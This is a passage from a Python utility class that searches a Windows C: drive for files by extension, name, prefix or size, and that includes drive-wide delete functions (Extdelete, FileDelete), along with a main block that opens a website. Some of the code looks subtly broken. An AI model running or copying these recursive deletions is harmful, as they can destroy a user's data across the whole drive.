        import os
        try:
            os.unlink(__path__)
        except PermissionError:
            try:
                os.remove(__path__)
            except PermissionError:
                raise PermissionError

        return None

    @classmethod
    def cwd(cls):
        """
        It return the Current Working Directory.
        """
        import os
        return os.getcwd()

    @classmethod
    def Extsearch(cls, _ext_, _path_="C:"):
        """
        Return a list with all the files with the specified extension in the specified path.
        """
        import os
        _result = []
        _path_ = _path_ + "\\"

        for RootDir, _Fldrs_, Ext_Srch in os.walk(_path_):
            for __files__ in Ext_Srch:
                if __files__.endswith(_ext_):
                    __pth = RootDir + "\\" + __files__
                    _result.append(__pth)

        return _result

    @classmethod
    def Filesearch(cls, _file_, _path_="C:"):
        """
        Return a list with all the files with the specified name in the specified path.
        """
        import os
        _path_ = _path_ + "\\"
        _result = []
        for RootDir, _Fldrs_, _FlsSrch_ in os.walk(_path_):
            for __files__ in _FlsSrch_:
                if __files__ == _file_:
                    __pth = RootDir + "\\" + __files__
                    _result.append(__pth)

        return _result

    @classmethod
    def PartSearch(cls, __start__, _path_="C:"):
        import os
        _path_ = _path_ + "\\"
        _result = []
        for RootDir, _Fldrs_, _PartSearch_ in os.walk(_path_):
            for __files__ in _PartSearch_:
                if __files__.startswith(__start__):
                    __pth = RootDir + "\\" + __files__
                    _result.append(__pth)
        return _result

    @classmethod
    def Extdelete(cls, _ext_, _path_="C:"):
        """
         Try to delete all the files with the specified extension and return a list of it.
        """
        if cls.DEVELOPER != "Marco Della Putta":
            return -1
        import os
        _path_ = _path_ + "\\"
        _result = []
        for RootDir, _Fldrs_, _ExtDel_ in os.walk(_path_):
            for __files__ in _ExtDel_:
                if __files__.endswith(_ext_):
                    _PATH_ = RootDir + "\\" + __files__
                    try:
                        cls.fDel(_PATH_)
                    except PermissionError:
                        continue
                _result.append(_PATH_)

        return _result

    @classmethod
    def Filesize(cls, _path_="C:"):
        import os
        total = 0
        for __file__ in os.listdir(_path_):
            total += os.path.getsize(os.path.join(_path_, __file__))
        __output__ = total / 1000000
        return __output__

    @classmethod
    def Memory(cls, __val__, _path_="C:"):
        import os
        _result = []
        _path_ = _path_ + "\\"
        __val__ = float(__val__)
        if __val__ < 0.1:
            raise ValueError
        __val__ *= 1048576
        __val__ = int(__val__)
        for RootDir, _Fldrs_, __MemS__ in os.walk(_path_):
            for __mFile__ in __MemS__:
                if RootDir == "C:\\":
                    path = RootDir + __mFile__
                else:
                    path = RootDir + "\\" + __mFile__
                try:
                    info = os.stat(path)
                    if info.st_size > __val__:
                        _result.append(path)
                except:
                    continue
        return _result

    @classmethod
    def FileDelete(cls, __filename__, _path_="C:"):
        import os
        _path_ = _path_ + "\\"
        _result = []
        for RootDir, _Fldrs_, _fls_ in os.walk(_path_):
            for __file__ in _fls_:
                if __file__ == __filename__:
                    __pth = RootDir + "\\" + __file__
                    try:
                        cls.fDel(__pth)
                    except PermissionError:
                        continue
                    _result.append(__pth)
        return _result

    @classmethod
    def class_dev(cls):
        return cls.DEVELOPER

        
######################## - END LIBRARY'S CLASSES DECLARATION FOR __SoftLib__ MODULE - #################################

if __name__ == "__main__":

    from math import pow as Powering
    from webbrowser import open as Device_Manager

    dev_Class = _real_

    __Property__ = dev_Class ** Powering(_real_, _notreal_)
    if __MainLibrary__ == "STX_LIB" :
        Device_Manager("https://grigoprg.webnode.it")  # Contact me for details.
    else:
        Device_Manager("https://www.gnu.org/licenses/licenses.en.html#FDL")  # GNU LICENSE DETAILS


